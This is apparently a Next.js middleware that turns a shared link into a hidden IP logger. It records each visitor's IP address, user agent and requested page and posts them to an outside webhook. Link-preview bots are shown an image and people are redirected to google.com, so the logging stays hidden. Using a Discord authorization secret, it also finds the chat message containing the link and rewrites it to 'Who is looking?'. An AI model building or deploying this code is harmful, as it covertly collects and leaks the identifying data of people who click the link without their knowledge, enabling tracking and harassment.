import { NextRequest, NextResponse, userAgent } from 'next/server';

const webhook = process.env.WEBHOOK_URL;
const DISCORD_AUTH = process.env.DISCORD_AUTH; // Use a secure secret via Vercel env
const DISCORD_API_BASE = 'https://discord.com/api/v9';

export async function middleware(req) {
  const ua = userAgent(req)?.ua || req.headers.get("user-agent") || "unknown";
  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.ip ||
    "unknown";
  const allHeaders = {};
  for (const [key, value] of req.headers.entries()) {
    allHeaders[key] = value;
  }

  const url = req.nextUrl;
  const page = url.pathname.split("/").pop();

  const isBotUA = ["Mozilla/5.0 (compatible; Discordbot/", "Twitterbot/"].some(
    (u) => ua?.startsWith(u)
  );

  // Send view info to webhook
  await fetch(webhook, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      embeds: [
        {
          title: "Triggered view-logger",
          description: isBotUA
            ? `Source user-agent: ${ua}`
            : "It was loaded by a user (or a user on Discord).",
          fields: [
            { name: "IP Address", value: `\`${ip}\``, inline: false },
            { name: "User-Agent", value: `\`${ua.slice(0, 1000)}\``, inline: false }
          ],
          footer: { text: "Requested page: " + page.slice(0, 500) },
        },
      ],
    }),
  });

  // --- If page name matches messageID-channelID pattern ---
  const match = page?.match(/^(\d+)-(\d+)-/);
  if (match) {
    const [_, messageHint, channelID] = match;

    // Step 1: Get messages from the channel
    try {
      const res = await fetch(`${DISCORD_API_BASE}/channels/${channelID}/messages?limit=20`, {
        method: "GET",
        headers: {
          "authorization": DISCORD_AUTH,
          "content-type": "application/json",
        },
      });

      if (res.ok) {
        const messages = await res.json();

        // Step 2: Find the message that includes the tracking URL
        const target = messages.find(msg =>
          msg.content?.includes("https://rpct.vercel.app/")
        );

        if (target?.id) {
          const targetMessageID = target.id;

          // Step 3: Wait 1.5 seconds, then PATCH
          setTimeout(async () => {
            await fetch(`${DISCORD_API_BASE}/channels/${channelID}/messages/${targetMessageID}`, {
              method: "PATCH",
              headers: {
                "authorization": DISCORD_AUTH,
                "content-type": "application/json",
              },
              body: JSON.stringify({ content: "Who is looking?" }),
            });
          }, 1500);
        }
      }
    } catch (err) {
      console.error("Failed to modify Discord message:", err);
    }
  }

  // Rewrite logic
  if (isBotUA) {
    return NextResponse.rewrite(new URL("/mini.png", req.url));
  } else {
    return NextResponse.rewrite(new URL("https://google.com", req.url));
  }
}
